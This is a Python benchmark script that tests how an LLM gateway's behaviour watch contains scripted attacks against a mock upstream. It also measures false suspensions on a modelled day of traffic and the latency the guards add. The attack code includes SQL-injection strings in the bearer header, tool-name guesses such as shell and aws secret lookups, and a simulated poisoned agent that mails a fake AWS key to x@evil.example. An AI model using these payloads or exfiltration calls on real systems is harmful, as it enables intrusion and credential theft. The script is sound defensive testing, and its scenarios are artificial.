"""Phase 3 (ADR 0012): how fast the behaviour watch contains scripted attacks, what it costs
legitimate traffic, and what it adds to latency.

    python bench/security_eval.py            # in-process, mock upstream, $0

Everything runs in-process against the real app (auth, limits, executor, MCP proxy, watch) with
the mock provider and a fake tool server. A virtual clock drives the shared state, so a day of
traffic replays in seconds and windows (5 min, 10 min) mean what they say. Wall-clock
"seconds" below are virtual: they measure how many requests and dollars an attack gets, not
network time.

Attacks:
  A1 LLMjacking  a stolen key hammered from a new network, 10 requests a second (R2, R3)
  A2 tool probe  a key guessing tool names (R1)
  A3 auth probe  LiteLLM-style SQL injection in the bearer value, then a key-shaped guess sweep
                 (R4)
  A4 exfil       a poisoned agent puts a credential in a mail tool's arguments (C3 block, R5)

Normal day: 40 keys in four profiles (interactive, service, nightly batch, agent with tools),
~30k requests and tool calls over 24 virtual hours, with the everyday noise that trips naive
rules: second offices, laptops on new networks, mistyped tool names, a client with a stale key.
It is a model, written for this eval; real traffic will differ. It counts suspensions and IP
blocks that hit legitimate keys.

Overhead: p50/p99 of one chat request with the guards on vs off (MemoryState, and Redis when
SLUICE_TEST_REDIS or localhost:6379 answers). Writes bench/results/security-eval.{md,json}.
"""
from __future__ import annotations

import asyncio
import json
import os
import random
import statistics
import time
from pathlib import Path

import httpx
from mcp.types import CallToolResult, TextContent, Tool
from opentelemetry.sdk.trace.export.in_memory_span_exporter import InMemorySpanExporter

from sluice.api.app import create_app
from sluice.auth.keys import KeyStore
from sluice.config import Settings
from sluice.limits.state import MemoryState, RedisState
from sluice.mcp.audit import McpAudit
from sluice.mcp.pins import ToolPins
from sluice.providers.mock import MockProvider
from sluice.telemetry.ledger import UsageLedger
from sluice.telemetry.otel import build_telemetry

OUT = Path(__file__).parent / "results"
R = random.Random(12)
PRICE = 1e5  # USD per Mtok in and out: $0.40 per default request (fake prices, mock upstream)
DAY = 86400


class FakeTools:
    """Stands in for Upstreams: three tools, instant answers."""

    pins = None

    def __init__(self):
        self._tools = {f"{s}__{t}": Tool(name=t, inputSchema={"type": "object"}) for s, t in (
            ("orders", "lookup_order"), ("orders", "track_shipment"), ("mail", "send"))}

    async def tools(self):
        return self._tools

    async def call(self, name, args):
        return CallToolResult(content=[TextContent(type="text", text="ok")])

    async def close(self):
        return None


class Clock:
    def __init__(self):
        self.t = 1_800_000_000.0

    def __call__(self):
        return self.t


def gateway(state=None, watch=None, guard=None):
    clock = Clock()
    settings = Settings(
        providers={"mock": {"type": "mock"}},
        routes={"m": {"chain": [{"provider": "mock", "upstream_model": "x", "retries": 0,
                                 "price_in_per_mtok": PRICE, "price_out_per_mtok": PRICE}]}},
        watch=watch or {}, guard=guard or {}, limits={"default_max_tokens": 64})
    keys = KeyStore(":memory:")
    app = create_app(settings, {"mock": MockProvider(text="hello there world")},
                     state=state or MemoryState(clock=clock), keystore=keys,
                     telemetry=build_telemetry(span_exporter=InMemorySpanExporter()),
                     ledger=UsageLedger(":memory:"), mcp_audit=McpAudit(":memory:"),
                     tool_pins=ToolPins(":memory:"))
    app.state.mcp.up = FakeTools()
    app.state.mcp.watch.alerts.recent.clear()
    return app, keys, clock


class Caller:
    def __init__(self, app):
        self.app = app
        self.clients: dict[str, httpx.AsyncClient] = {}

    def _c(self, ip):
        if ip not in self.clients:
            self.clients[ip] = httpx.AsyncClient(
                transport=httpx.ASGITransport(app=self.app, client=(ip, 40000)),
                base_url="http://gw")
        return self.clients[ip]

    async def chat(self, raw, ip, max_tokens=64, text="hi"):
        return await self._c(ip).post("/v1/chat/completions", headers={
            "Authorization": f"Bearer {raw}"}, json={
            "model": "m", "messages": [{"role": "user", "content": text}],
            "max_tokens": max_tokens})

    async def tool(self, raw, ip, name, args=None):
        r = await self._c(ip).post("/mcp", headers={"Authorization": f"Bearer {raw}"}, json={
            "jsonrpc": "2.0", "id": 1, "method": "tools/call",
            "params": {"name": name, "arguments": args or {}}})
        if r.status_code != 200:
            return r.status_code
        return "error" if "error" in r.json() else 200

    async def close(self):
        for c in self.clients.values():
            await c.aclose()


def suspended(keys, key_id) -> bool:
    return keys.get(key_id).status == "suspended"


async def spent(app, key) -> float:
    return (await app.state.shared.spend(key.limit_id))[0] / 1e6


# --- attacks ----------------------------------------------------------------------------------

async def a1_llmjacking(watch_on: bool) -> dict:
    app, keys, clock = gateway(watch={"enabled": watch_on})
    raw, k = keys.create("svc", team="search", rpm=10_000, tpm=10**9, daily_budget_usd=50.0)
    c = Caller(app)
    for _ in range(25):  # the owner's normal morning: ~$10
        clock.t += 60
        await c.chat(raw, "10.1.0.5")
    before, t0, served = await spent(app, k), clock.t, 0
    for _ in range(5000):  # the thief: 10 requests a second from another network
        clock.t += 0.1
        r = await c.chat(raw, "198.51.100.23")
        if r.status_code != 200:
            break
        served += 1
    out = {"served": served, "usd": round(await spent(app, k) - before, 2),
           "seconds": round(clock.t - t0, 1), "budget_usd": 50.0,
           "stopped_by": (keys.get(k.id).suspended_reason or "").split(":")[1]
           if suspended(keys, k.id) else (r.json()["error"]["code"] if r.status_code != 200
                                          else "nothing"),
           "alerts": [a["rule"] for a in app.state.watch.alerts.recent][::-1]}
    await c.close()
    return out


async def a2_tool_probe() -> dict:
    app, keys, clock = gateway()
    raw, k = keys.create("agent", allowed_tools=["orders__lookup_*"], tool_rpm=10_000)
    c = Caller(app)
    guesses = [f"{s}__{t}" for s in ("files", "shell", "db", "aws", "github", "mail")
               for t in ("read", "exec", "query", "list", "send", "get_secret")]
    t0, tried = clock.t, 0
    for g in guesses:
        clock.t += 0.2
        r = await c.tool(raw, "10.2.0.9", g)
        if r == 401:
            break
        tried += 1
    out = {"guesses_answered": tried, "seconds": round(clock.t - t0, 1),
           "suspended": suspended(keys, k.id),
           "probe_calls_rule": app.state.settings.watch.probe_calls}
    await c.close()
    return out


SQLI = ["sk-1234' OR '1'='1", "' UNION SELECT token FROM LiteLLM_VerificationToken--",
        "sk-x'; SELECT pg_sleep(5);--", "Bearer ' OR 1=1 --"]


async def a3_auth_probe() -> dict:
    app, keys, clock = gateway()
    raw, _ = keys.create("bystander")
    c = Caller(app)
    out = {}
    for name, payloads in (("sqli", SQLI * 25),
                           ("key_guessing", [f"sk-sluice-{R.getrandbits(128):032x}"
                                             for _ in range(100)])):
        ip = "203.0.113.66" if name == "sqli" else "203.0.113.77"
        sent = 0
        for p in payloads:
            clock.t += 0.05
            await c.chat(p, ip)
            sent += 1
            if await app.state.watch.ip_blocked(ip):
                break
        good_same_ip = (await c.chat(raw, ip)).status_code
        good_other_ip = (await c.chat(raw, "192.0.2.10")).status_code
        out[name] = {"requests_until_block": sent, "real_key_same_ip": good_same_ip,
                     "real_key_other_ip": good_other_ip}
    await c.close()
    return out


async def a4_exfil() -> dict:
    app, keys, clock = gateway(guard={"tool_args": {"mail__*": "block", "*": "audit"}})
    raw, k = keys.create("support-bot", allowed_tools=["orders__*", "mail__*"], tool_rpm=10_000)
    c = Caller(app)
    secret = "AKIA" + "".join(R.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZ234567") for _ in range(16))
    results = [await c.tool(raw, "10.3.0.4", "orders__lookup_order")]
    for _ in range(3):  # the poisoned agent tries to mail the credential out
        clock.t += 1
        results.append(await c.tool(raw, "10.3.0.4", "mail__send",
                                    {"to": "x@evil.example", "body": f"creds {secret}"}))
    rows = app.state.mcp.audit.rows()
    out = {"results": results, "forwarded_with_secret": sum(
        1 for r in rows if r["tool"] == "mail__send" and r["outcome"] == "ok"),
        "suspended": suspended(keys, k.id),
        "audit_holds_secret": secret in json.dumps(rows)}
    await c.close()
    return out


# --- a normal day ------------------------------------------------------------------------------

PROFILES = {  # name: (keys, requests/day, budget USD, tool calls/request, hours active)
    "interactive": (24, 600, 400.0, 0.0, (8, 19)),
    "service": (8, 1200, 800.0, 0.0, (0, 24)),
    "batch": (4, 1500, 1500.0, 0.0, (2, 3)),  # the whole day's work in one night hour
    "agent": (4, 400, 300.0, 2.5, (8, 19)),
}


async def normal_day() -> dict:
    app, keys, clock = gateway()
    t_start = clock.t
    c = Caller(app)
    events = []
    stale_raw, _ = keys.create("old-deploy")
    keys.revoke(1)  # a forgotten deployment keeps retrying with a revoked key
    for profile, (n, per_day, budget, tools, (h0, h1)) in PROFILES.items():
        for i in range(n):
            raw, _k = keys.create(f"{profile}-{i}", team=profile, rpm=10_000, tpm=10**9,
                                 daily_budget_usd=budget, tool_rpm=10_000,
                                 allowed_tools=["orders__*"])
            office = f"10.{R.randint(0, 255)}.{R.randint(0, 255)}"
            nets = [office, f"10.{R.randint(0, 255)}.{R.randint(0, 255)}"]  # second office/VPN
            for _ in range(per_day):
                t = R.uniform(h0, h1) * 3600
                # 10% of the time: a laptop on some other network
                net = R.choice(nets) if R.random() < 0.9 else f"172.16.{R.randint(0, 255)}"
                ip = f"{net}.{R.randint(1, 254)}"
                events.append((t, "chat", raw, ip, None))
                for _ in range(int(tools) + (R.random() < tools % 1)):
                    name = "orders__lookup_order" if R.random() > 0.01 else "orders__lookup"
                    events.append((t + R.uniform(0, 5), "tool", raw, ip, name))  # 1% typos
    for _ in range(200):  # the stale deployment: a retry every few minutes, all day
        events.append((R.uniform(0, DAY), "chat", stale_raw, "10.99.0.5", None))
    events.sort(key=lambda e: e[0])
    for t, kind, raw, ip, name in events:
        clock.t = t_start + t
        if kind == "chat":
            await c.chat(raw, ip)
        else:
            await c.tool(raw, ip, name)
    auto = [(k.name, k.suspended_reason) for k, _ in keys.list() if k.status == "suspended"]
    alerts = [a for a in app.state.watch.alerts.recent]
    out = {"events": len(events), "keys": sum(p[0] for p in PROFILES.values()),
           "false_suspensions": auto,
           "ip_blocks": [a["ip"] for a in alerts if a["action"] == "block_ip"],
           "new_network_alerts": sum(a["rule"] == "R3_new_network" for a in alerts),
           "alerts_total": len(alerts)}
    await c.close()
    return out


# --- overhead ----------------------------------------------------------------------------------

async def overhead(state_factory, rounds=12, per_round=150, warmup=300) -> dict:
    """Both configurations are built and warmed up first, then measured in alternating
    rounds, so warm-up and drift (CPU clock, GC, the Redis connection pool) hit both alike."""
    runs = {}
    for label, watch, guard in (("guards off", {"enabled": False},
                                 {"chat": "off", "tool_args": {}, "tool_results": {}}),
                                ("guards on", {}, {})):
        app, keys, _ = gateway(state=state_factory(), watch=watch, guard=guard)
        # a budget so large R2 never fires: a suspended key would answer a fast 401, and the
        # first version of this measurement timed exactly that
        raw, _ = keys.create("bench", rpm=10**6, tpm=10**9, daily_budget_usd=1e9)
        runs[label] = (Caller(app), raw, [])

    async def one(label, i, keep):
        c, raw, lat = runs[label]
        t0 = time.perf_counter()
        r = await c.chat(raw, "10.0.0.1", text=f"Summarise ticket {i} for the on-call engineer.")
        assert r.status_code == 200, (label, r.status_code)
        if keep:
            lat.append((time.perf_counter() - t0) * 1000)

    for label in runs:
        for i in range(warmup):
            await one(label, i, False)
    for r in range(rounds):
        for label in (runs if r % 2 == 0 else reversed(list(runs))):
            for i in range(per_round):
                await one(label, i, True)
    out = {}
    for label, (c, _, lat) in runs.items():
        await c.close()
        lat.sort()
        out[label] = {"p50_ms": round(statistics.median(lat), 3),
                      "p99_ms": round(lat[int(0.99 * len(lat))], 3), "n": len(lat)}
    return out


def redis_url() -> str | None:
    import redis

    for url in (os.environ.get("SLUICE_TEST_REDIS"), "redis://localhost:6379/15"):
        if url:
            try:
                redis.Redis.from_url(url).ping()
                return url
            except redis.RedisError:
                continue
    return None


async def main() -> None:
    import logging

    logging.getLogger("sluice.security").setLevel(logging.ERROR)  # alerts are counted, not printed
    res = {"a1_llmjacking": {"watch on": await a1_llmjacking(True),
                             "watch off": await a1_llmjacking(False)},
           "a2_tool_probe": await a2_tool_probe(), "a3_auth_probe": await a3_auth_probe(),
           "a4_exfil": await a4_exfil(), "normal_day": await normal_day(),
           "overhead": {"memory": await overhead(MemoryState)}}
    url = redis_url()
    if url:
        import redis

        redis.Redis.from_url(url).flushdb()
        res["overhead"]["redis"] = await overhead(lambda: RedisState(url))
    (OUT / "security-eval.json").write_text(json.dumps(res, indent=1))
    a1, a1off = res["a1_llmjacking"]["watch on"], res["a1_llmjacking"]["watch off"]
    a2, a3, a4, nd = res["a2_tool_probe"], res["a3_auth_probe"], res["a4_exfil"], res["normal_day"]
    md = [
        "# Behaviour watch: attacks contained, legitimate traffic disturbed, latency added",
        "",
        ("Generated by `bench/security_eval.py`: in-process against the real app with the mock "
        "upstream ($0), a fake tool server, and a virtual clock driving the shared state."),
        "",
        ("> **Caveats.** \"Seconds\" are virtual: they count how long an attack runs at its "
         "scripted rate before it is stopped, not network time. The normal day is a traffic "
         "model written for this eval (profiles below), not a replay of real traffic, so its "
         "false-suspension count shows which everyday noise the rules tolerate, not a rate you "
         "can promise. Fake prices make one default request cost $0.40."),
        "",
        "## Attacks",
        "",
        "| attack | without the watch | with the watch |",
        "|---|---|---|",
        (f"| A1 stolen key, 10 requests/s from a new network, $50/day budget | "
        f"{a1off['served']} requests, **${a1off['usd']}** before {a1off['stopped_by']} | "
        f"{a1['served']} requests, **${a1['usd']}** in {a1['seconds']} s, then suspended "
        f"({a1['stopped_by']}); alerts: {', '.join(a1['alerts'])} |"),
        (f"| A2 guessing tool names, 5/s | every guess answered (\"unknown\") | "
        f"{a2['guesses_answered']} guesses in {a2['seconds']} s, then suspended "
        f"(R1 at {a2['probe_calls_rule']}) |"),
        (f"| A3a SQL injection in the bearer (LiteLLM probe shapes) | every attempt answered | "
        f"IP blocked after **{a3['sqli']['requests_until_block']}** request; real key from that "
        f"IP: {a3['sqli']['real_key_same_ip']}, from elsewhere: "
        f"{a3['sqli']['real_key_other_ip']} |"),
        (f"| A3b key-shaped guesses, 20/s | every attempt answered | IP blocked after "
        f"**{a3['key_guessing']['requests_until_block']}** |"),
        (f"| A4 credential in a mail tool's arguments (`mail__*: block`) | forwarded | "
        f"forwarded with the secret: **{a4['forwarded_with_secret']}**; key suspended: "
        f"{a4['suspended']}; secret in the audit: {a4['audit_holds_secret']} |"),
        "",
        ("A1 without the watch is stopped only by the daily budget, as before phase 3. With "
        "it, R2 (half the daily budget within 10 minutes) suspends the key; the R3 alert fired "
        "on the thief's first request, before any of that."),
        "",
        "## A normal day",
        "",
        (f"{nd['keys']} keys, {nd['events']:,} chat requests and tool calls over 24 virtual "
        "hours:"),
        "",
        "| profile | keys | requests/day each | budget | tool calls/request | active |",
        "|---|---|---|---|---|---|",
        *[f"| {p} | {n} | {d} | ${b:.0f} | {t} | {h0:02d}:00-{h1:02d}:00 |"
          for p, (n, d, b, t, (h0, h1)) in PROFILES.items()],
        "",
        ("Noise in the model: each key uses two office networks plus a laptop on a random "
        "network 10% of the time; 1% of agent tool calls use a mistyped tool name; a forgotten "
        "deployment retries with a revoked key ~200 times through the day."),
        "",
        f"- **False suspensions: {len(nd['false_suspensions'])}**"
        + ("" if not nd["false_suspensions"] else ": " + "; ".join(
            f"{n} ({r})" for n, r in nd["false_suspensions"])),
        f"- **IP blocks: {len(nd['ip_blocks'])}**" + (
            f" ({', '.join(nd['ip_blocks'])})" if nd["ip_blocks"] else ""),
        (f"- New-network alerts (R3, alert only): {nd['new_network_alerts']}. Every laptop on a "
        "new /24 is one; at this rate R3 is a log, not a pager."),
        "",
        "Where false positives come from, by rule (not all of them occur in this model):",
        ("- R1: an agent with many refused calls, e.g. a model that keeps inventing a tool name: "
        "10 in 5 minutes suspends it."),
        ("- R2: a legitimate job that spends half its daily budget within 10 minutes. The batch "
        "profile spends its whole day in an hour, ~1/6 per 10 minutes, and passes; a tighter "
        "batch would not."),
        ("- R4: many clients behind one NAT or untrusted proxy share an IP, so one stale client "
        "retrying 20 times a minute blocks all of them. List the proxy in "
        "`auth.trusted_proxies`."),
        "",
        "## Latency added",
        "",
        ("One chat request in-process (mock upstream answers instantly), sequential. Both "
        "configurations are warmed up, then measured in alternating rounds "
        f"({res['overhead']['memory']['guards on']['n']:,} requests each). The difference is "
        "what the key-shape check, IP-block lookup, new-network check, prompt scan and "
        "burn-rate counter cost together. Run-to-run noise on this laptop is a few hundredths "
        "of a millisecond at p50 and much more at p99."),
        "",
        "| state | guards off p50 / p99 | guards on p50 / p99 |",
        "|---|---|---|",
        *[f"| {s} | {v['guards off']['p50_ms']} / {v['guards off']['p99_ms']} ms | "
          f"{v['guards on']['p50_ms']} / {v['guards on']['p99_ms']} ms |"
          for s, v in res["overhead"].items()],
    ]
    (OUT / "security-eval.md").write_text("\n".join(md) + "\n")
    print("\n".join(md[md.index("## Attacks"):]))


if __name__ == "__main__":
    asyncio.run(main())
